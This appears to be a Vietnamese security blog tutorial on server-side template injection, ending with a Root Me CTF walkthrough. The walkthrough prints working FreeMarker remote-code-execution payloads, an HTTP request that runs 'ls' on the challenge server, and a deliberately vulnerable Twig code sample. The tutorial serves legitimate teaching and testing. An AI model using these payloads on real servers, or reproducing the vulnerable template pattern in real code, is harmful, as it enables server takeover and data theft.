## 1. Server-side template injection là gì ?
- Template engines (công cụ giúp chúng ta tách mã HTML thành các phần nhỏ hơn mà chúng ta có thể sử dụng lại trên nhiều tập tin HTML) được sử dụng rộng rãi bởi các ứng dụng web nhằm trình bày dữ liệu thông qua các trang web và emails. Việc nhúng các đầu vào từ phía người dùng theo cách không an toàn vào trong templates dẫn đến Server-Side Template Injection - một lỗ hổng nghiêm trọng thường xuyên dễ dàng bị nhầm lẫn với Cross-Site Scripting (XSS), hoặc hoàn toàn bị ngó lơ. 
![](https://images.viblo.asia/fb9ee2bd-415d-4b83-8fc0-afbfa8d9ceb7.png)

- Không giống như XSS, Template Injection có thể được sử dụng để tấn công trực tiếp vào bên trong máy chủ web và thường bao gồm Remote Code Execution (RCE) - thực thi mã từ xa, biến mọi ứng dụng dễ bị tấn công thành các điểm then chốt tiềm năng (a potential pivot point). Template Injection có thể phát sinh không những thông qua những lỗi thuộc về phía nhà phát triển mà còn thông qua những hành vi có chủ đích của template để cố gắng cung cấp những chức năng phong phú - thường được thực hiện bởi wikis, blogs, các ứng dụng tiếp thị và các hệ thống quản lý nội dung.

## 2. Server-side template injection xảy ra khi nào ?
- Server-side template injection xảy ra khi những nội dung được nhập vào từ phía người dùng được nhúng không an toàn vào template ở phía máy chủ, cho phép người sử dụng có thể inject template trực tiếp. Bằng cách sử dụng các template độc hại , kẻ tấn công có thể thực thi mã tùy ý và kiểm soát hoàn toàn web server. Mức độ nghiêm trọng của vấn đề này khác nhau tùy thuộc vào loại template engines được sử dụng. Các template engine có thể nằm trong phạm vi từ dễ dàng đến gần như không thể khai thác. 
- Xem xét ví dụ sau: 
    + Một ứng dụng marketing gửi hàng loạt các emails, và sử dụng Twig template để gửi lời chào đến khách hàng. Nếu chỉ có tên người dùng được truyền vào template như ví dụ sau, mọi thứ sẽ hoạt động tốt : <br>
`$output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) );`
    + Tuy nhiên, nếu người dùng được phép tùy chỉnh các email này, vấn đề sẽ phát sinh: <br>
    `$output = $twig->render($_GET['custom_email'], array("first_name" => $user.first_name) );`
	+ Trong trường hợp này, người dùng kiểm soát nội dung của template thông qua tham số **GET customemail**, thay vì giá trị được truyền vào nó. Điều này dẫn đến một lỗ hổng XSS. Tuy nhiên XSS chỉ là một biểu hiện của một lỗi tinh vi và nghiêm trọng hơn. Đoạn code này đã chỉ ra một loại attack surface có phạm vi rộng nhưng lại dễ bị bỏ qua.
    + Output từ 2 message sau đây đưa ra dấu hiệu về lỗ hổng phía máy chủ:
```
customemail={{7*7}}
49
```
```
customemail={{self}}
Object of class TwigTemplate7ae62e582f8a35e5ea6cc639800ecf15b96c0d6f78db3538221c1145580ca4a5 could not be converted to string*
```
 
 
+ Lỗ hổng này thường được phát sinh thông qua việc các nhà phát triển cố ý cho phép nguời dùng submit hoặc edit các template.  Hơn nữa, Template injection không chủ ý  cực kỳ dễ bỏ lỡ vì thường sẽ không có bất kỳ dấu hiệu nào có thể nhìn thấy. 
* Các lỗ hổng template injection có thể rất nghiêm trọng và gây hại tới toàn bộ chức năng hoặc dữ liệu của ứng dụng. Cũng có khả năng nó sử dụng server như một platform cho các cuộc tấn công tiếp theo với các hệ thống khác. Bên cạnh đó, một số lỗ hổng template injection có thể không gây ra các rủi ro bảo mật đáng kể.

## 3. Quy trình của một cuộc tấn công
![](https://images.viblo.asia/43842564-1a0b-420b-9e51-70263e70ae68.png)
### Detect
>  Lỗ hổng này có thể xuất hiện trong hai bối cảnh riêng biệt, mỗi bối cảnh đòi hỏi phương pháp phát hiện riêng.
1. Plaintext context

* Lỗi thường sẽ xuất hiện theo một trong những phương thức sau:
```
smarty=Hello {user.name}
Hello user1
``` 
```
freemarker=Hello ${username}
Hello newuser
```
```html
any=<b>Hello</b>
<b>Hello<b>
```
 
* Để phát hiện lỗi, chúng ta cần gọi template engine bằng cách nhúng một câu lệnh. Có một số lượng lớn các template languages nhưng phần lớn trong đó chia sẻ các đặc điểm cú pháp cơ bản. Chúng ta có thể tận dụng điều này bằng cách gửi các payload sử dụng các toán tử cơ bản để phát hiện nhiều template engine bằng 1 câu HTTP request duy nhất.
```
smarty=Hello ${7*7}
Hello 49
``` 
```
freemarker=Hello ${7*7}
Hello 49
```
2. Code context

* Dữ liệu đầu vào của người dùng cũng có thể được đặt trong một template statement, thường là tên biến
```
personal_greeting=username
Hello user01
```
 
* Biến này thậm chí còn dễ bỏ sót hơn trong quá trình đánh giá, vì nó không dẫn đến XSS một cách rõ ràng. Thay đổi giá trị của username thường sẽ trả về kết quả rỗng hoặc gây lỗi ứng dụng. Trường hợp này có thể được phát hiện bằng cách xác minh các tham số không thể XSS trực tiếp, sau đó thoát ra khỏi template statement và thêm thẻ HTML vào sau nó :
```
personal_greeting=username<tag>
Hello
```
```
personal_greeting=username}}<tag>
Hello user01 <tag>
```
 
### Identify
 - Sau khi phát hiện được template injection , bước tiếp theo là xác định template engine đang được sử dụng. Mũi tên xanh và đỏ tương ứng lần lượt với response 'success' và 'failure'. Trong một số trường hợp, một payload có thể có nhiều response thành công khác nhau 
- ví dụ: test với input {{7 * '7'}} sẽ dẫn đến 
    + 49 trong Twig 
    + 7777777 trong Jinja2 
    + Không trả về gì nếu không có template engine nào đước sử dụng.
    ![](https://images.viblo.asia/1b20d79b-7ca2-4056-943b-97f706baf51d.png)

### Exploit
1. Read

Sau khi xác định được template engine, việc tiếp theo đọc tài liệu liên quan. Các nội dung cần quan tâm chính là:
+ Cú pháp cơ bản của template engine
+ Danh sách các phương thức, hàm, bộ lọc và biến đã được dựng sẵn
+ Danh sách các tiện ích mở rộng / plugin 
2. Explore

Ở bước này, việc chúng ta cần làm là tìm ra chính xác những gì có thể truy cập được.
+ Xem xét cả những objects mặc định được cung cấp bởi template engine lẫn các objects dành riêng cho ứng dụng được truyền vào template bởi các nhà phát triển. 
+ Bruteforce các tên biến. Các object do nhà phát triển cung cấp có khả năng chứa các thông tin nhạy cảm.

3. Attack

Xem xét từng function để tìm các lỗ hổng có thể khai thác. Các dạng tấn công có thể là tạo object tùy ý, đọc / ghi file tùy ý (bao gồm cả remote file), hay khai thác lỗ hổng leo thang đặc quyền.

## 4. Ví dụ về Server-Side Template Injection

* Một challenge của root me : 
http://challenge01.root-me.org/web-serveur/ch41/
*  Đọc source code và thấy function sau:
```
function checkNickname() {
	    var serviceUrl = "check";
	    var nick = $("#nickname").val();
	    var postData = "nickname=" + encodeURIComponent(nick);
	    $.ajax({
	        url: serviceUrl,
	        type: "POST",
	        data: postData,
	        contentType: "application/x-www-form-urlencoded",
	        dataType: "text",
	        success: function(data) {
	            $("#result").text(data);
	        },
	        error: function(data) {
	            $("#result").text("An error occurs!");
	        }
	    });
	}
```
* Hàm này sử dụng ajax trong jquery để gửi data từ client lên server:
    + url: serviceUrl (gửi data đến url: /web-serveur/ch41/check)
    + type : "POST" (dùng POST method)
    + data : postData (data được gửi đi nằm trong biến postData)
 
* Nếu request thành công thì nó sẽ trả lại dữ liệu trong "data" và đổ vào thẻ div có id là "result", ngược lại thì đưa ra thông báo lỗi "An error occurs!".
 
* Đầu tiên, cần phải xác định loại template engine được sử dụng: 
![](https://images.viblo.asia/022930cb-0447-4d30-b728-84edcd4ebbb4.png)

![](https://images.viblo.asia/ee733249-3b20-43ab-9320-472469e6deeb.png)

=> Báo error như ảnh thì đoán engine được dùng có thể là FreeMarker
- Xem các payload trong link sau để hiểu rõ hơn :
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- Trong link trên đã có ngay gợi ý đoạn code excution (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#code-execution-2)

```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
```
-  <#assign> cho phép định nghĩa biến ngay trong template (http://freemarker.org/docs/dgui_misc_var.html).  Đoạn code trên tạo một tên biến là "ex", việc sử dụng Built-in `"freemarker.template.utility.Execute"?new()` cho phép tạo một object tùy ý, chính là object của "Excute" Class được implement từ "TemplateModel". 
-  Sử dụng payload trên để sửa nội dung input trong "nickname" khi bắt gói tin bằng Burp Suite:

 
```http
POST /web-serveur/ch41/check HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: http://challenge01.root-me.org/web-serveur /ch41/
Content-Length: 0
DNT: 1
Connection: close
nickname=<#assign command="freemarker.template.utility. Execute"?new() > ${command("ls") }
```
 
* Trang web response lại:

```http
HTTP/1.1 200 OK Server: nginx 
Date: Thu, 06 Feb 2020 02:27:09 GMT
Connection: close 
Content-Length: 73
It's seems that I know you :) 	SECRET_FLAG.txt
pom.xml 
src 
target 
webapp
```
 
 
thay "ls" thành "cat SECRET_FLAG.txt", lấy được Flag: 
![](https://images.viblo.asia/2fae635f-c366-4744-9e3c-92a5d24513fa.png)

## 5. Kết luận
Các lỗ hổng liên quan đến Server-side template injection thường bị bỏ qua. Để hạn chế, ngăn chặn những rủi ro không đáng có, các lập trình viên nên cẩn thận trong việc cho phép dữ liệu đầu vào của người dùng được chèn vào template cũng như kiểm tra kỹ template được sử dụng trong Website của mình.


## References
- https://portswigger.net/kb/issues/00101080_server-side-template-injection
- https://portswigger.net/research/server-side-template-injection
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- http://dienpv-0pain.blogspot.com/2017/06/server-side-template-injection.html